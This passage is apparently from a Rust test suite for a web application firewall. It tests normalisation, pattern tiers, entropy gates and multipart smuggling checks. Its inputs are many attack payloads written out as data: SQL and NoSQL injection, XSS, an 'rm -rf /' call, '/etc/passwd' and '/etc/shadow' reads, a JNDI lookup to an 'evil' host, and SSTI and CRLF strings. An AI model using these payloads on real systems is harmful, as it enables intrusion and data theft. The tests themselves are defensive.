        let data = vec![b'A'; 100];
        assert!(shannon_entropy(&data) < 0.01);
    }

    #[test]
    fn entropy_random_is_high() {
        // Simulated high entropy (all 256 byte values)
        let data: Vec<u8> = (0..=255).cycle().take(512).collect();
        assert!(shannon_entropy(&data) > 7.5);
    }

    #[test]
    fn entropy_normal_text_is_moderate() {
        let data =
            b"This is a normal English text with reasonable entropy levels for testing purposes.";
        let e = shannon_entropy(data);
        assert!(e > 3.0 && e < 5.5, "entropy was {e}");
    }

    // ── Plus-to-space evasion ──

    #[test]
    fn url_decode_converts_plus_to_space() {
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"union+select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn denies_plus_encoded_sqli_in_body() {
        // "union+select" → "union select" after + normalization. "union select"
        // is aggressive-tier now (false-positive on prose under balanced).
        let body = br#"{"query":"union+select+*+from+users"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_plus_encoded_sqli() {
        assert_eq!(
            validate_uri("/api/search?q='+or+1=1", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn url_decode_handles_mixed_encoding() {
        // %27 = ' and + = space
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"admin%27+OR+%271%27=%271")).as_ref(),
            b"admin' or '1'='1"
        );
    }

    // ── SQL comment evasion ──

    #[test]
    fn strip_sql_comments_basic() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/**/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn strip_sql_comments_nested_content() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/*hack*/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn whitespace_runs_do_not_evade_patterns() {
        // Padding tokens with extra spaces / tabs must not slip past the
        // single-space patterns — normalize_unified collapses inline
        // whitespace. Each payload matches ONLY after collapsing (the raw,
        // double-spaced form hits no pattern), so this isolates the fix.
        // Command injection (balanced): double space after ';'.
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                br#"{"c":"ls;  cat secret"}"#,
                &strict_profile()
            ),
            WafVerdict::Deny(_)
        ));
        // Tab as the separator's whitespace (real 0x09 byte).
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                b"{\"c\":\"ls;\tcat secret\"}",
                &strict_profile()
            ),
            WafVerdict::Deny(_)
        ));
        // SQLi with a doubled space (aggressive tier holds "union select").
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                br#"{"q":"union  select 1"}"#,
                &aggressive_profile()
            ),
            WafVerdict::Deny(_)
        ));
        // \n is preserved so the newline command-injection patterns still fire.
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                b"{\"c\":\"x\ncat secret\"}",
                &strict_profile()
            ),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn uri_normalizes_iis_and_overlong_encodings() {
        // IIS-style %uXXXX: %u003c -> '<', so %u003cscript trips <script.
        assert!(
            matches!(
                validate_uri("/x?h=%u003cscript%u003e", WafMode::Balanced),
                WafVerdict::Deny(_)
            ),
            "%uXXXX should decode like \\uXXXX"
        );
        // Overlong UTF-8 of '/': ..%c0%af..%c0%af -> ../../ (traversal).
        assert!(
            matches!(
                validate_uri("/x?f=..%c0%af..%c0%afetc/passwd", WafMode::Balanced),
                WafVerdict::Deny(_)
            ),
            "overlong %c0%af should fold to '/'"
        );
    }

    #[test]
    fn disallowed_content_type_is_still_scanned_when_lenient() {
        // deny_unknown_content_types = false must NOT forward a body unscanned:
        // an injection in a mislabelled (text/html) body is still caught.
        let lenient = WafProfile {
            deny_unknown_content_types: false,
            ..WafProfile::default()
        };
        assert!(
            matches!(
                validate_request("POST", Some("text/html"), b"; cat /etc/passwd", &lenient),
                WafVerdict::Deny(_)
            ),
            "lenient profile must still injection-scan a disallowed content-type"
        );
        // A clean body on a disallowed type is allowed under the lenient policy.
        assert_eq!(
            validate_request("POST", Some("text/html"), b"hello world", &lenient),
            WafVerdict::Allow
        );
        // and the entropy check runs on it too (docs/config/waf.md): every byte value once
        let uniform: Vec<u8> = (0..=255u8).collect();
        assert_eq!(
            validate_request("POST", Some("text/html"), &uniform, &lenient),
            WafVerdict::Deny("suspicious payload entropy")
        );
    }

    #[test]
    fn denies_sql_comment_evasion_in_body() {
        // "union/**/select" → "union select" after comment stripping;
        // aggressive-tier pattern now.
        let body = br#"{"q":"union/**/select * from users"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_sql_comment_evasion() {
        assert_eq!(
            validate_uri("/search?q=union/**/select", WafMode::Aggressive),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn balanced_allows_demoted_fp_patterns_aggressive_denies() {
        // The e2e bug-hunt flagged these as false positives on real traffic:
        // they no longer fire under the default (balanced) profile, but a
        // strict/admin (aggressive) route still catches them. Regression guard.
        let legit: &[&[u8]] = &[
            br#"{"text":"the trade union select committee met today"}"#,
            br#"{"err":"relation information_schema.columns does not exist"}"#,
            br#"{"url":"ldap://ad.corp.local:389"}"#,
            br#"{"html":"<!doctype html><img src=\"/logo.png\">"}"#,
            br#"{"note":"never assign to __proto__ in JS code"}"#,
        ];
        for body in legit {
            let shown = String::from_utf8_lossy(body);
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &strict_profile()),
                WafVerdict::Allow,
                "balanced should ALLOW legit body: {shown}"
            );
            assert!(
                matches!(
                    validate_request(
                        "POST",
                        Some("application/json"),
                        body,
                        &aggressive_profile()
                    ),
                    WafVerdict::Deny(_)
                ),
                "aggressive should DENY: {shown}"
            );
        }
    }

    // ── JSON unicode escape evasion ──

    #[test]
    fn normalize_json_unicode_basic() {
        // \u0027 = '  (single quote)
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u0027")).as_ref(),
            b"'"
        );
    }

    #[test]
    fn normalize_json_unicode_angle_bracket() {
        // \u003c = <
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u003cscript")).as_ref(),
            b"<script"
        );
    }

    #[test]
    fn denies_json_unicode_xss_in_body() {
        // \\u003c in raw bytes = literal \u003c after normalization
        // Use <script only (no alert) so raw scan doesn't match the literal
        let body = br#"{"html":"\\u003cscript src=x>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    // ── New categories (v0.1.4) ──

    #[test]
    fn aggressive_denies_xss_event_handler_oninput() {
        // `oninput=` is aggressive-only (low-anchor handler, FP-prone in
        // any code-bearing payload). Test pinned under aggressive mode.
        let body = br#"{"html":"<div oninput=alert(1)>"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_img_tag() {
        let body = br#"{"html":"<img src=x onerror=alert(1)>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_srcdoc() {
        let body = br#"{"html":"<iframe srcdoc=<script>alert(1)</script>>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_xss_innerhtml() {
        // `innerhtml` is aggressive-only (high FP in dev tooling, MDN-style
        // doc snippets, code-paste APIs).
        let body = br#"{"code":"element.innerHTML = userInput"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_gt() {
        // `$gt` (no anchor) is aggressive-only — matches anywhere, including
        // legit strings like `"$gt-23"`. Aggressive mode pins the catch.
        let body = br#"{"username":{"$gt":""},"password":{"$gt":""}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_where() {
        let body = br#"{"$where":"this.password == 'admin'"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_regex() {
        let body = br#"{"username":{"$regex":".*"}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_java_deserialization() {
        // Java RCE class-name patterns are aggressive-only because they
        // also appear verbatim in any JVM stack trace forwarded by APMs.
        let body = br#"{"cmd":"Runtime.getRuntime().exec('id')"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_python_deserialization() {
        let body = br#"{"data":"pickle.loads(base64.b64decode(payload))"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_python_os_system() {
        let body = br#"{"cmd":"os.system('rm -rf /')"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_deserialization() {
        let body = br#"{"data":"unserialize($_GET['data'])"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_filter_wrapper() {
        let body = br#"{"file":"php://filter/convert.base64-encode/resource=config.php"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_graphql_introspection_with_whitespace() {
        // `{__schema` (no space) is in BALANCED — see
        // `denies_graphql_type_probe` which exercises that. With realistic
        // GraphQL formatting (`{ __schema`), the lone `__schema` token is
        // what fires, and that lives in AGGRESSIVE.
        let body = br#"{"query":"{ __schema { types { name } } }"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_graphql_type_probe() {
        let body = br#"{"query":"{__type(name:\"User\"){fields{name}}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn allows_legitimate_json_with_dollar() {
        // Legitimate JSON with $ in values (MongoDB query syntax in app code is fine)
        let body = br#"{"price":42.99,"currency":"$USD","note":"item costs $5"}"#;
        // $USD and $5 should NOT match $gt/$ne/$regex (those require exact prefix)
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_legitimate_graphql_query() {
        // Normal GraphQL query without introspection
        let body = br#"{"query":"{ users(limit: 10) { id name email } }"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── LDAP / XXE / SSTI / CRLF (v0.1.4b) ──

    #[test]
    fn denies_ldap_injection() {
        let body = br#"{"filter":")(cn=*))"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_entity() {
        let body = br#"{"xml":"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_jinja() {
        let body = br#"{"name":"{{7*7}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_java() {
        let body = b"{\"expr\":\"#{t(java.lang.Runtime).getRuntime()}\"}";
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_crlf_injection() {
        let body = br#"{"header":"value%0d%0aSet-Cookie: admin=true"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_system_file() {
        let body = br#"{"dtd":"SYSTEM \"file:///etc/shadow\""}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xsl_injection() {
        let body = br#"{"xml":"<xsl:stylesheet version=\"1.0\">"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    // ══════════════════════════════════════════════════════════════════
    // NEW CONTRACT (v0.1.7+):
    //   * `Balanced` (default) MUST NOT block legitimate developer / dev
    //     tooling / educational content carrying tokens that the previous
    //     "all-patterns" WAF flagged as attacks (alert(, eval(, $gt, …).
    //   * `Aggressive` keeps the broad coverage for routes that opt in.
    //   * Entropy default 6.5 bits/byte — base64 / JWT must pass; only
    //     near-random / encrypted payloads are flagged.
    //   * `entropy_check = false` is a kill switch.
    // ══════════════════════════════════════════════════════════════════

    #[test]
    fn balanced_allows_legitimate_alert_in_text() {
        // Customer-support comment quoting "alert(" as a literal — the
        // single most common false-positive class with the old WAF.
        let body = br#"{"comment":"the user clicked alert(true) in the broken page"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_allows_eval_and_documentcookie_in_docs() {
        // MDN-style snippet posted to a docs API — would have been blocked
        // by `eval(` and `document.cookie`, both now aggressive-only.
        let body =
            br#"{"snippet":"never trust eval(input) and never read document.cookie directly"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_allows_dollar_prefixed_id() {
        // `$gt-23` would have matched the unanchored `$gt` mongo pattern.
        // Aggressive still blocks; balanced lets through.
        let body = br#"{"id":"$gt-23","tag":"$ne-marker"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn aggressive_still_blocks_dollar_gt() {
        // Inverse of above — confirms aggressive mode keeps detection.
        let body = br#"{"username":{"$gt":""}}"#;
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn balanced_allows_java_stack_trace_payload() {
        // Stack-trace forwarder POSTs Java class names (Runtime.getRuntime,
        // ProcessBuilder, ObjectInputStream). Used to be blocked; now must
        // pass under balanced.
        let body = br#"{"trace":"java.lang.Runtime.getRuntime called from ProcessBuilder via ObjectInputStream"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_keeps_high_signal_xss_blocking() {
        // Regression guard: balanced mode must STILL block tag-anchored
        // XSS (`<script`), `onerror=` event handler, `javascript:` sink,
        // and CVE-class patterns like `${jndi:`. These are the SOC-grade
        // detections we promise.
        let cases: &[&[u8]] = &[
            br#"{"x":"<script>x</script>"}"#,
            br#"{"x":"<img src=x onerror=foo>"}"#,
            br#"{"x":"javascript:foo()"}"#,
            br#"{"x":"${jndi:ldap://evil/a}"}"#,
            br#"{"x":"' or '1'='1"}"#,
            br#"{"x":"../../../etc/passwd"}"#,
        ];
        for body in cases {
            assert!(
                matches!(
                    validate_request("POST", Some("application/json"), body, &strict_profile()),
                    WafVerdict::Deny(_)
                ),
                "balanced mode must still block: {}",
                std::str::from_utf8(body).unwrap()
            );
        }
    }

    // ── Entropy: new default 6.5 with toggle ──

    /// Build a body of the form `{"k":"<payload>"}` that reaches the
    /// entropy gate (≥256 body bytes, ≥128 string-content bytes).
    fn json_with_string_value(value_bytes: &[u8]) -> Vec<u8> {
        let mut v = Vec::with_capacity(value_bytes.len() + 12);
        v.extend_from_slice(br#"{"k":""#);
        v.extend_from_slice(value_bytes);
        v.extend_from_slice(br#""}"#);
        v
    }

    /// Pseudo-random bytes from a tiny LCG. Self-contained — no rand crate.
    /// Output entropy is close to 8 bits/byte over a 1KB window, so this
    /// reliably exceeds the 6.5 default threshold.
    fn pseudo_random(len: usize, seed: u64) -> Vec<u8> {
        let mut out = Vec::with_capacity(len);
        let mut state = seed.wrapping_add(0x9E3779B97F4A7C15);
        for _ in 0..len {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            out.push((state >> 56) as u8);
        }
        out
    }

    #[test]
    fn balanced_allows_base64_payload_in_json() {
        // Pure-base64 alphabet maxes at 6.0 bits/byte. The old default
        // (5.5) would have blocked any sufficiently long base64. New
        // default 6.5 leaves headroom — so JWTs / signed URLs / image
        // uploads as base64 pass.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let body = json_with_string_value(&payload);
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &strict_profile()),
            WafVerdict::Allow,
            "balanced threshold (6.5) must let base64 through"
        );
    }

    /// Profile that explicitly allows `application/octet-stream` so we
    /// can exercise the entropy gate on raw binary bodies without the
    /// JSON gate (or the unknown-content-type short-circuit) firing.
    fn binary_profile() -> WafProfile {
        WafProfile {
            allowed_content_types: vec!["application/octet-stream".to_string()],
            // Inherit balanced defaults (mode, threshold 6.5, gate on).
            ..WafProfile::default()
        }
    }

    #[test]
    fn balanced_blocks_random_payload_octet_stream() {
        // Test the entropy gate in isolation: octet-stream skips the JSON
        // gate, and `binary_profile` allows the content-type so we don't
        // short-circuit on Gate 2.
        let body = pseudo_random(1024, 0xDEAD_BEEF);
        let v = validate_request(
            "POST",
            Some("application/octet-stream"),
            &body,
            &binary_profile(),
        );
        assert_eq!(
            v,
            WafVerdict::Deny("suspicious payload entropy"),
            "balanced 6.5 threshold must flag near-random payloads, got {v:?}"
        );
    }

    #[test]
    fn entropy_check_disabled_lets_random_through() {
        // Kill switch: `entropy_check = false` skips Gate 4 entirely.
        // Same body that the previous test blocks must now pass.
        let body = pseudo_random(1024, 0xCAFEF00D);
        let mut p = binary_profile();
        p.entropy_check = false;
        assert_eq!(
            validate_request("POST", Some("application/octet-stream"), &body, &p),
            WafVerdict::Allow,
            "entropy_check=false must short-circuit the gate"
        );
    }

    #[test]
    fn entropy_threshold_is_configurable() {
        // Lower the threshold to the legacy 5.5; base64 again gets denied.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let body = json_with_string_value(&payload);
        let mut p = strict_profile();
        p.entropy_threshold = 5.5;
        assert!(matches!(
            validate_request("POST", Some("application/json"), &body, &p),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn entropy_skips_low_string_content_json() {
        // Numeric-heavy JSON has very few string bytes; the JSON-string
        // entropy path returns None and the gate skips. Body is ≥256
        // bytes so the size precondition is met.
        let mut body = Vec::from(&b"{\"data\":["[..]);
        for i in 0..50 {
            if i > 0 {
                body.push(b',');
            }
            body.extend_from_slice(format!("{i}").as_bytes());
        }
        body.extend_from_slice(b"]}");
        // Pad to >= 256 bytes with zero-entropy structural junk OUTSIDE
        // strings, so the byte count is right but string content stays low.
        while body.len() < 300 {
            body.extend_from_slice(b"          ");
        }
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn json_string_entropy_function_distinguishes_payloads() {
        // Direct unit test of the new helper, independent of validate_request.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let base64_body = json_with_string_value(&payload);
        let e_b64 = shannon_entropy_json_strings(&base64_body, 128).unwrap();
        assert!(
            e_b64 < 6.5,
            "base64 entropy should be below 6.5 (got {e_b64})"
        );

        let random = pseudo_random(1024, 0x1234_5678);
        let random: Vec<u8> = random
            .into_iter()
            .map(|b| if b == b'"' || b == b'\\' { b'A' } else { b })
            .collect();
        let rand_body = json_with_string_value(&random);
        let e_rand = shannon_entropy_json_strings(&rand_body, 128).unwrap();
        assert!(
            e_rand > 7.0,
            "random-byte entropy should be above 7.0 (got {e_rand})"
        );
    }

    #[test]
    fn json_string_entropy_returns_none_when_undersample() {
        // Tiny string content under min_sample → None.
        let body = br#"{"k":"hi","n":42}"#;
        assert!(shannon_entropy_json_strings(body, 128).is_none());
    }

    // ── Multipart structure gate (#694) ─────────────────────────────────

    /// Build a well-formed multipart/form-data body from (field name, optional
    /// filename, content) parts, exactly as the strict parser expects it.
    fn mp(boundary: &str, parts: &[(&str, Option<&str>, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        out.extend_from_slice(b"--");
        out.extend_from_slice(boundary.as_bytes());
        for (name, filename, content) in parts {
            out.extend_from_slice(b"\r\nContent-Disposition: form-data; name=\"");
            out.extend_from_slice(name.as_bytes());
            out.push(b'"');
            if let Some(f) = filename {
                out.extend_from_slice(b"; filename=\"");
                out.extend_from_slice(f.as_bytes());
                out.push(b'"');
            }
            out.extend_from_slice(b"\r\n\r\n");
            out.extend_from_slice(content);
            out.extend_from_slice(b"\r\n--");
            out.extend_from_slice(boundary.as_bytes());
        }
        out.extend_from_slice(b"--");
        out
    }

    fn ct(boundary: &str) -> String {
        format!("multipart/form-data; boundary={boundary}")
    }

    #[test]
    fn a_real_looking_form_passes() {
        let p = WafProfile::default();
        let body = mp(
            "----WebKitFormBoundary7MA4YWxkTrZu0gW",
            &[
                ("field1", None, b"value one"),
                ("file1", Some("photo.jpg"), b"\xff\xd8\xff\xe0 jpeg bytes"),
                ("file2", Some(""), b""), // empty file part still parses
            ],
        );
        assert_eq!(
            multipart_structure(&ct("----WebKitFormBoundary7MA4YWxkTrZu0gW"), &body, &p),
            WafVerdict::Allow
        );
    }

    #[test]
    fn a_quoted_boundary_is_accepted() {
        let p = WafProfile::default();
        let body = mp("abc", &[("x", None, b"v")]);
        assert_eq!(
            multipart_structure("multipart/form-data; boundary=\"abc\"", &body, &p),
            WafVerdict::Allow
        );
    }

    #[test]
    fn too_many_parts_is_denied() {
        let parts: Vec<(&str, Option<&str>, &[u8])> =
            (0..5).map(|_| ("f", None, &b"v"[..])).collect();
        let body = mp("B", &parts);
        let under = WafProfile {
            max_parts: 5,
            ..WafProfile::default()
        };
        let over = WafProfile {
            max_parts: 4,
            ..WafProfile::default()
        };
        assert_eq!(
            multipart_structure(&ct("B"), &body, &under),
            WafVerdict::Allow
        );
        assert_eq!(
            multipart_structure(&ct("B"), &body, &over),
            WafVerdict::Deny("too many multipart parts")
        );
    }

    #[test]
    fn too_many_file_parts_is_denied() {
        let parts: Vec<(&str, Option<&str>, &[u8])> =
            (0..3).map(|_| ("f", Some("x"), &b""[..])).collect();
        let body = mp("B", &parts);
        let over = WafProfile {
            max_file_parts: 2,
            ..WafProfile::default()
        };
        assert_eq!(
            multipart_structure(&ct("B"), &body, &over),
            WafVerdict::Deny("too many multipart file parts")
        );
    }

    #[test]
    fn too_many_part_headers_is_denied() {
        // One part with many extra headers.
        let mut body = Vec::new();
        body.extend_from_slice(b"--B\r\nContent-Disposition: form-data; name=\"x\"\r\n");
        for i in 0..20 {
            body.extend_from_slice(format!("X-H{i}: v\r\n").as_bytes());
        }
        body.extend_from_slice(b"\r\nv\r\n--B--");
        let p = WafProfile::default(); // max_part_headers = 16
        assert_eq!(
            multipart_structure(&ct("B"), &body, &p),
            WafVerdict::Deny("too many multipart part headers")
        );
    }

    #[test]
    fn oversized_part_headers_are_denied() {
        let big = "a".repeat(9000);
        let body =
            format!("--B\r\nContent-Disposition: form-data; name=\"{big}\"\r\n\r\nv\r\n--B--");
        let p = WafProfile::default(); // max_part_header_bytes = 8192
        assert_eq!(
            multipart_structure(&ct("B"), body.as_bytes(), &p),
            WafVerdict::Deny("multipart part headers too large")
        );
    }

    #[test]
    fn a_denied_field_name_is_refused_however_it_is_cased() {
        let p = WafProfile {
            deny_field_names: vec!["PHP_SESSION_UPLOAD_PROGRESS".to_string()],
            ..WafProfile::default()
        };
        let body = mp("B", &[("php_session_upload_progress", None, b"x")]);
        assert_eq!(
            multipart_structure(&ct("B"), &body, &p),
            WafVerdict::Deny("denied multipart field name")
        );
    }

    #[test]
    fn a_denied_part_header_name_is_refused_by_default() {
        // __proto__ is in the default deny_part_header_names.
        let body =
            b"--B\r\nContent-Disposition: form-data; name=\"x\"\r\n__proto__: y\r\n\r\nv\r\n--B--";
        let p = WafProfile::default();
        assert_eq!(
            multipart_structure(&ct("B"), body, &p),
            WafVerdict::Deny("denied multipart part header name")
        );
    }

    #[test]
    fn malformed_and_smuggling_shapes_are_refused() {
        let p = WafProfile::default();
        // No boundary parameter.
        assert_eq!(
            multipart_structure("multipart/form-data", b"--B--", &p),
            WafVerdict::Deny("malformed multipart boundary")
        );
        // A second boundary= is a smuggling surface.
        assert_eq!(
            multipart_structure(
                "multipart/form-data; boundary=a; boundary=b",
                &mp("a", &[("x", None, b"v")]),
                &p
            ),
            WafVerdict::Deny("malformed multipart boundary")
        );
        // Preamble before the first boundary.
        let mut pre = b"garbage".to_vec();
        pre.extend_from_slice(&mp("B", &[("x", None, b"v")]));
        assert_eq!(
            multipart_structure(&ct("B"), &pre, &p),
            WafVerdict::Deny("multipart body does not start at its boundary")
        );
        // No closing delimiter.
        let unterminated = b"--B\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\nv\r\n";
        assert_eq!(
            multipart_structure(&ct("B"), unterminated, &p),
            WafVerdict::Deny("unterminated multipart body")
        );
        // A part with no field name.
        let no_name = b"--B\r\nContent-Type: text/plain\r\n\r\nv\r\n--B--";
        assert_eq!(
            multipart_structure(&ct("B"), no_name, &p),
            WafVerdict::Deny("multipart part without a field name")
        );
    }

    #[test]
    fn the_gate_runs_through_validate_request() {
        let p = WafProfile::default();
        let good = mp("B", &[("x", None, b"hello")]);
        assert_eq!(
            validate_request("POST", Some(&ct("B")), &good, &p),
            WafVerdict::Allow
        );
        let bad = b"garbage--B--";
        assert_eq!(
            validate_request("POST", Some(&ct("B")), bad, &p),
            WafVerdict::Deny("multipart body does not start at its boundary")
        );
    }

    #[test]
    fn a_boundary_on_a_non_form_data_type_is_still_parsed_strictly() {
        // Spring CVE-2026-41853: a content-type that is not canonical multipart/form-data but
        // carries a boundary is parsed too (a lenient upstream would), so a smuggling shape
        // cannot slip past unparsed. A strict content-type policy already denies these at the
        // content-type gate; this covers the lenient profile, where the body reaches Gate 2b.
        let p = WafProfile {
            deny_unknown_content_types: false,
            ..WafProfile::default()
        };
        let mut smuggle = b"preamble".to_vec();
        smuggle.extend_from_slice(&mp("B", &[("x", None, b"v")]));
        assert_eq!(
            validate_request("POST", Some("multipart/mixed; boundary=B"), &smuggle, &p),
            WafVerdict::Deny("multipart body does not start at its boundary")
        );
        // even a non-multipart media type carrying a boundary is parsed, not forwarded raw.
        assert_eq!(
            validate_request(
                "POST",
                Some("application/x-smuggle; boundary=B"),
                &smuggle,
                &p
            ),
            WafVerdict::Deny("multipart body does not start at its boundary")
        );
    }

    #[test]
    fn a_well_formed_non_form_data_multipart_passes_without_the_name_rule() {
        // A structural multipart/mixed part carries Content-Type, not a form-data name. That is
        // allowed in structural mode, refused under multipart/form-data.
        let p = WafProfile::default();
        let body = b"--B\r\nContent-Type: text/plain\r\n\r\nhello\r\n--B--";
        assert_eq!(
            multipart_structure("multipart/mixed; boundary=B", body, &p),
            WafVerdict::Allow
        );
        assert_eq!(
            multipart_structure("multipart/form-data; boundary=B", body, &p),
            WafVerdict::Deny("multipart part without a field name")
        );
    }

    #[test]
    fn a_form_field_name_with_a_huge_array_index_is_refused() {
        // multer CVE-2026-77078: items[4294967295] makes some frameworks allocate a huge array.
        let p = WafProfile::default(); // max_field_name_index = 100000
        let evil = mp("B", &[("items[4294967295]", None, b"v")]);
        assert_eq!(
            multipart_structure(&ct("B"), &evil, &p),
            WafVerdict::Deny("multipart field name array index too large")
        );
        // real array forms stay well under the cap.
        let ok = mp("B", &[("items[3]", None, b"a"), ("user[name]", None, b"b")]);
        assert_eq!(multipart_structure(&ct("B"), &ok, &p), WafVerdict::Allow);
    }

    #[test]
    fn field_name_index_helper_catches_overflow_and_respects_the_cap() {
        assert!(field_name_index_exceeds(b"items[4294967295]", 100_000));
        assert!(field_name_index_exceeds(
            b"x[99999999999999999999999]",
            100_000
        )); // u64 overflow
        assert!(field_name_index_exceeds(b"a[200000]", 100_000));
